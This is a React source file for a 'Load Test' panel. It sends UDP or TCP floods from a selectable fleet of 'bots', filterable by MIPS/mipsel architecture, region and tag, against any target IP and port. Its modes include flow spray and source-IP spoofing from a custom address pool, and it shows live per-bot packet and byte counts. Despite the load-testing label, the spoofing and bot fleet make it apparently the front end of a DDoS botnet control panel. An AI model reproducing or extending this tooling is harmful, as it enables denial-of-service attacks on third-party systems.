import { useEffect, useMemo, useRef, useState } from 'react'
import { Zap, Loader2 } from 'lucide-react'
import { StatusBadge } from './ui.jsx'
import { api } from '../api.js'

const SELECTOR_MODES = [
  { id: 'all', label: 'All' },
  { id: 'ids', label: 'By ID' },
  { id: 'filter', label: 'Filter' },
]

const SEND_MODES = [
  { id: 'udp_raw', label: 'UDP Raw' },
  { id: 'udp_flow_spray', label: 'Flow Spray' },
  { id: 'udp_spoof_flow', label: 'Spoof Flow' },
  { id: 'mixed', label: 'Mixed' },
]

const td = 'px-3 py-2.5 border-t border-line align-top'
const th = 'px-3 py-2.5 text-left text-[11px] font-mono font-semibold text-muted uppercase tracking-wider'
const STATUS_MAP = { pending: 'scanning', sent: 'running', done: 'success', expired: 'offline', gone: 'offline' }

export default function LoadTest({ nodes = [] }) {
  const [selectorMode, setSelectorMode] = useState('all')
  const [ids, setIds] = useState('')
  const [filterStatus, setFilterStatus] = useState('')
  const [filterArch, setFilterArch] = useState('')
  const [filterRegion, setFilterRegion] = useState('')
  const [filterTag, setFilterTag] = useState('')

  const [target, setTarget] = useState('')
  const [port, setPort] = useState('5001')
  const [duration, setDuration] = useState('10')
  const [threads, setThreads] = useState('1')
  const [pps, setPps] = useState('')
  const [bps, setBps] = useState('')
  const [srcPort, setSrcPort] = useState('')
  const [pattern, setPattern] = useState('')
  const [sendMode, setSendMode] = useState('udp_raw')
  const [proto, setProto] = useState('udp')
  const [spoofSource, setSpoofSource] = useState(false)
  const [srcIps, setSrcIps] = useState('')

  const [busy, setBusy] = useState(false)
  const [error, setError] = useState('')
  const [task, setTask] = useState(null)
  const pollRef = useRef(null)

  const statuses = useMemo(() => [...new Set(nodes.map((n) => n.status))].sort(), [nodes])
  const archs = useMemo(() => {
    const set = new Set()
    for (const n of nodes) {
      const st = (n.systemType || '').toLowerCase()
      if (st.includes('mipsel')) set.add('mipsel')
      else if (st.includes('mips')) set.add('mips')
      else if (st && st !== 'unknown') set.add(st)
    }
    return [...set].sort()
  }, [nodes])
  const regions = useMemo(
    () => [...new Set(nodes.map((n) => n.region).filter((r) => r && r !== 'unknown'))].sort(),
    [nodes],
  )
  const tagPairs = useMemo(() => {
    const set = new Set()
    for (const n of nodes) {
      for (const [k, v] of Object.entries(n.tags || {})) set.add(v ? `${k}=${v}` : k)
    }
    return [...set].sort()
  }, [nodes])

  function buildSelector() {
    if (selectorMode === 'all') return 'all'
    if (selectorMode === 'ids') {
      const list = ids.split(/[,\s]+/).map((s) => s.trim()).filter(Boolean)
      return list.length ? list : 'all'
    }
    const f = {}
    if (filterStatus) f.status = filterStatus
    if (filterArch) f.arch = filterArch
    if (filterRegion) f.region = filterRegion
    if (filterTag) {
      const eq = filterTag.indexOf('=')
      if (eq > 0) f.tags = { [filterTag.slice(0, eq)]: filterTag.slice(eq + 1) }
      else f.tags = { [filterTag]: '' }
    }
    return Object.keys(f).length ? f : 'all'
  }

  const matched = useMemo(() => {
    if (selectorMode === 'all') return nodes.length
    if (selectorMode === 'ids') {
      const list = ids.split(/[,\s]+/).map((s) => s.trim()).filter(Boolean)
      if (!list.length) return 0
      const set = new Set(list)
      return nodes.filter((n) => set.has(n.id)).length
    }
    return nodes.filter((n) => {
      if (filterStatus && n.status !== filterStatus) return false
      if (filterArch && !(n.systemType || '').toLowerCase().includes(filterArch.toLowerCase())) return false
      if (filterRegion && n.region !== filterRegion) return false
      if (filterTag) {
        const nt = n.tags || {}
        const eq = filterTag.indexOf('=')
        if (eq > 0) {
          const k = filterTag.slice(0, eq), v = filterTag.slice(eq + 1)
          if (nt[k] !== v) return false
        } else {
          if (!(filterTag in nt)) return false
        }
      }
      return true
    }).length
  }, [selectorMode, ids, filterStatus, filterArch, filterRegion, filterTag, nodes])

  const taskId = task?.taskId
  useEffect(() => {
    if (!taskId) return
    const tick = async () => {
      const r = await api.fleetTask(taskId)
      if (r.ok) setTask((prev) => ({ ...prev, ...r.data }))
    }
    tick()
    pollRef.current = setInterval(tick, 2000)
    return () => clearInterval(pollRef.current)
  }, [taskId])

  async function fire() {
    if (busy || !target.trim()) return
    setBusy(true)
    setError('')
    setTask(null)
    try {
      const selector = buildSelector()
      const cr = await api.loadTestConfirm(selector)
      if (!cr.ok) { setError(cr.data?.error || `confirm failed (${cr.status})`); return }

      const p = parseInt(port, 10) || 5001
      const d = parseInt(duration, 10) || 10
      const t = parseInt(threads, 10) || 1
      const params = {
        confirm_token: cr.data.confirm_token,
        selector,
        target: target.trim(),
        port: p,
        duration: d,
        proto: sendMode !== 'udp_raw' ? 'udp' : proto,
        threads: t,
        mode: sendMode,
      }
      if (pps.trim()) params.pps = parseFloat(pps)
      if (bps.trim()) params.bps = parseFloat(bps)
      if (srcPort.trim()) params.src_port = parseInt(srcPort, 10)
      if (pattern) params.pattern = pattern
      if (spoofSource) params.spoof_source = true
      if (srcIps.trim()) {
        params.src_ips = srcIps.split(/[,\s]+/).map(s => s.trim()).filter(Boolean)
      }

      const r = await api.loadTest(params)
      if (!r.ok) { setError(r.data?.error || `failed (${r.status})`); return }
      setTask({
        taskId: r.data.taskId,
        proto,
        sendMode,
        target: target.trim(),
        port: p,
        duration: d,
        threads: t,
        count: r.data.count,
        nodes: [],
      })
    } catch {
      setError('connection failed.')
    } finally {
      setBusy(false)
    }
  }

  const done = task ? task.nodes.filter((n) => n.status === 'done').length : 0
  const canFire = !busy && target.trim() && matched > 0
  const durVal = duration || '10'
  const thrVal = threads || '1'
  const totalThreads = matched * (parseInt(thrVal, 10) || 1)

  return (
    <div className="space-y-3 max-w-4xl">
      {/* config */}
      <section className="card p-4">
        <h2 className="font-mono font-semibold text-[13px] text-bright uppercase tracking-wider flex items-center gap-2">
          <Zap className="size-4 text-accent" /> Load Test
        </h2>
        <p className="text-muted text-[12px] font-mono mt-1">
          fire UDP or TCP traffic from your fleet against a target server.
        </p>

        {/* selector */}
        <div className="mt-3 space-y-2">
          <div className="flex items-center gap-1">
            <span className="text-muted text-[11px] font-mono uppercase tracking-wider mr-2">agents:</span>
            {SELECTOR_MODES.map((m) => (
              <button
                key={m.id}
                type="button"
                onClick={() => setSelectorMode(m.id)}
                className={`px-2 py-1 text-[11px] font-mono uppercase tracking-wider border border-line ${
                  selectorMode === m.id ? 'bg-accent text-white' : 'bg-raised text-muted hover:text-bright'
                }`}
              >
                {m.label}
              </button>
            ))}
            <span className="text-muted text-[11px] font-mono ml-2">
              {matched}/{nodes.length} clients
            </span>
          </div>

          {selectorMode === 'ids' && (
            <input
              className="field w-full text-[12px]"
              placeholder="node-0007a1b2c3d4, node-00112233aabb, ..."
              value={ids}
              onChange={(e) => setIds(e.target.value)}
              spellCheck={false}
            />
          )}

          {selectorMode === 'filter' && (
            <div className="flex flex-wrap gap-2">
              <select className="field text-[12px]" value={filterStatus} onChange={(e) => setFilterStatus(e.target.value)}>
                <option value="">any status</option>
                {statuses.map((s) => <option key={s} value={s}>{s}</option>)}
              </select>
              <select className="field text-[12px]" value={filterArch} onChange={(e) => setFilterArch(e.target.value)}>
                <option value="">any arch</option>
                {archs.map((a) => <option key={a} value={a}>{a}</option>)}
              </select>
              {regions.length > 0 && (
                <select className="field text-[12px]" value={filterRegion} onChange={(e) => setFilterRegion(e.target.value)}>
                  <option value="">any region</option>
                  {regions.map((r) => <option key={r} value={r}>{r}</option>)}
                </select>
              )}
              {tagPairs.length > 0 && (
                <select className="field text-[12px]" value={filterTag} onChange={(e) => setFilterTag(e.target.value)}>
                  <option value="">any tag</option>
                  {tagPairs.map((t) => <option key={t} value={t}>{t}</option>)}
                </select>
              )}
            </div>
          )}
        </div>

        {/* params */}
        <div className="mt-4 grid grid-cols-2 sm:grid-cols-3 gap-2">
          <div className="col-span-2 sm:col-span-1">
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">Target IP / Hostname</label>
            <input
              className="w-full field text-[12px]"
              placeholder="10.0.0.5"
              value={target}
              onChange={(e) => setTarget(e.target.value)}
              spellCheck={false}
            />
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">Port</label>
            <input
              className="w-full field text-[12px]"
              placeholder="5001"
              value={port}
              onChange={(e) => setPort(e.target.value.replace(/[^0-9]/g, ''))}
            />
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">Send Mode</label>
            <select className="w-full field text-[12px]" value={sendMode} onChange={(e) => setSendMode(e.target.value)}>
              {SEND_MODES.map((m) => <option key={m.id} value={m.id}>{m.label}</option>)}
            </select>
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">Protocol</label>
            <select
              className="w-full field text-[12px]"
              value={sendMode !== 'udp_raw' ? 'udp' : proto}
              onChange={(e) => setProto(e.target.value)}
              disabled={sendMode !== 'udp_raw'}
            >
              <option value="udp">UDP</option>
              <option value="tcp">TCP</option>
            </select>
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">Duration (s)</label>
            <input
              className="w-full field text-[12px]"
              placeholder="10"
              value={duration}
              onChange={(e) => setDuration(e.target.value.replace(/[^0-9]/g, ''))}
            />
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">Threads / bot</label>
            <input
              className="w-full field text-[12px]"
              placeholder="1"
              value={threads}
              onChange={(e) => setThreads(e.target.value.replace(/[^0-9]/g, ''))}
            />
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">PPS limit (optional)</label>
            <input
              className="w-full field text-[12px]"
              placeholder="100000"
              value={pps}
              onChange={(e) => setPps(e.target.value.replace(/[^0-9.]/g, ''))}
            />
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">BPS limit (optional)</label>
            <input
              className="w-full field text-[12px]"
              placeholder="1000000000"
              value={bps}
              onChange={(e) => setBps(e.target.value.replace(/[^0-9.]/g, ''))}
            />
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">Src port (optional)</label>
            <input
              className="w-full field text-[12px]"
              placeholder="ephemeral"
              value={srcPort}
              onChange={(e) => setSrcPort(e.target.value.replace(/[^0-9]/g, ''))}
            />
          </div>
          <div>
            <label className="block text-[10px] font-mono text-muted uppercase mb-1">Payload pattern</label>
            <select className="w-full field text-[12px]" value={pattern} onChange={(e) => setPattern(e.target.value)}>
              <option value="">default (0xA5^i)</option>
              <option value="zeros">zeros</option>
              <option value="rand">random</option>
              <option value="seq">sequence only</option>
            </select>
          </div>
        </div>

        {sendMode === 'udp_spoof_flow' && (
          <div className="mt-3 space-y-2">
            <div className="flex items-center gap-3">
              <label className="flex items-center gap-2 text-[11px] font-mono text-muted cursor-pointer">
                <input type="checkbox" checked={spoofSource} onChange={(e) => setSpoofSource(e.target.checked)} className="accent-accent" />
                <span className="uppercase tracking-wider">Spoof source IPs</span>
              </label>
            </div>
            {spoofSource && (
              <div>
                <label className="block text-[10px] font-mono text-muted uppercase mb-1">Source IP pool (comma-separated)</label>
                <input
                  className="w-full field text-[12px]"
                  placeholder="10.0.0.1, 10.0.0.2, 10.0.0.3"
                  value={srcIps}
                  onChange={(e) => setSrcIps(e.target.value)}
                  spellCheck={false}
                />
              </div>
            )}
          </div>
        )}

        {error && <p className="text-bad text-[12px] font-mono mt-2">{error}</p>}
      </section>

      {/* fire button */}
      <button
        type="button"
        disabled={!canFire}
        onClick={fire}
        className="card p-0 overflow-hidden border-2 border-line hover:border-accent disabled:opacity-50 disabled:hover:border-line cursor-pointer text-left transition-colors group w-full"
      >
        <div className="px-4 py-3 bg-accent/10 group-hover:bg-accent/20 border-b border-line flex items-center gap-2 transition-colors">
          {busy ? <Loader2 className="size-5 animate-spin text-accent" /> : <Zap className="size-5 text-accent" />}
          <span className="font-mono font-bold text-[16px] text-accent uppercase tracking-wider">
            {SEND_MODES.find((m) => m.id === sendMode)?.label || sendMode} — {proto.toUpperCase()}
          </span>
        </div>
        <div className="px-4 py-3 grid grid-cols-2 sm:grid-cols-5 gap-x-4 gap-y-1.5 font-mono text-[12px]">
          <div className="flex justify-between sm:flex-col">
            <span className="text-muted">target</span>
            <span className="text-bright font-semibold">{target.trim() || '—'}:{port || '5001'}</span>
          </div>
          <div className="flex justify-between sm:flex-col">
            <span className="text-muted">duration</span>
            <span className="text-bright">{durVal}s</span>
          </div>
          <div className="flex justify-between sm:flex-col">
            <span className="text-muted">threads / bot</span>
            <span className="text-bright">{thrVal}</span>
          </div>
          <div className="flex justify-between sm:flex-col">
            <span className="text-muted">bots</span>
            <span className="text-warn font-semibold">{matched}</span>
          </div>
          <div className="flex justify-between sm:flex-col">
            <span className="text-muted">total threads</span>
            <span className="text-accent font-bold">{totalThreads}</span>
          </div>
        </div>
      </button>

      {/* results */}
      {task && (
        <section className="card overflow-hidden">
          <div className="px-3 pt-3 pb-2 space-y-1">
            <div className="flex flex-wrap items-center gap-2">
              <h3 className="font-mono font-semibold text-[13px] text-bright flex items-center gap-2">
                <Zap className="size-3.5 text-accent" />
                <span className="text-accent uppercase">{task.sendMode || task.proto}</span>
                <span className="text-muted">&rarr;</span>
                <span>{task.target}:{task.port}</span>
              </h3>
              <span className="text-muted text-[12px] font-mono">
                {done}/{task.nodes.length} responded
              </span>
            </div>
            <div className="flex gap-4 text-[11px] font-mono text-muted">
              <span>{task.duration}s duration</span>
              <span>{task.threads} thread{task.threads !== 1 ? 's' : ''}/bot</span>
              <span>{task.count} bot{task.count !== 1 ? 's' : ''}</span>
            </div>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-[13px] font-mono">
              <thead>
                <tr className="bg-raised/50">
                  <th className={th}>Client</th>
                  <th className={th}>Status</th>
                  <th className={th}>Output</th>
                </tr>
              </thead>
              <tbody>
                {task.nodes.length === 0 && (
                  <tr>
                    <td colSpan={3} className={`${td} text-center py-6 text-muted`}>
                      dispatched to {task.count} bot{task.count !== 1 ? 's' : ''} — waiting for check-in...
                    </td>
                  </tr>
                )}
                {task.nodes.map((n) => (
                  <tr key={n.nodeId} className="hover:bg-raised/60 transition-colors">
                    <td className={`${td} font-semibold text-bright whitespace-nowrap`}>{n.nodeId}</td>
                    <td className={td}>
                      <StatusBadge status={STATUS_MAP[n.status] || 'offline'} />
                    </td>
                    <td className={td}>
                      {n.output != null ? (
                        <pre className="text-[12px] whitespace-pre-wrap break-words max-h-40 overflow-auto bg-page text-ink rounded p-2 border border-line">
                          {n.output || '(no output)'}
                        </pre>
                      ) : n.heartbeat ? (
                        <div className="text-[11px] font-mono space-y-0.5">
                          <span className="text-accent">LIVE</span>
                          <span className="text-muted ml-2">ops: {n.heartbeat.tx_ops?.toLocaleString()}</span>
                          <span className="text-muted ml-2">bytes: {n.heartbeat.tx_bytes?.toLocaleString()}</span>
                          {n.heartbeat.err_eagain > 0 && <span className="text-warn ml-2">eagain: {n.heartbeat.err_eagain}</span>}
                        </div>
                      ) : (
                        <span className="text-muted">—</span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      )}
    </div>
  )
}
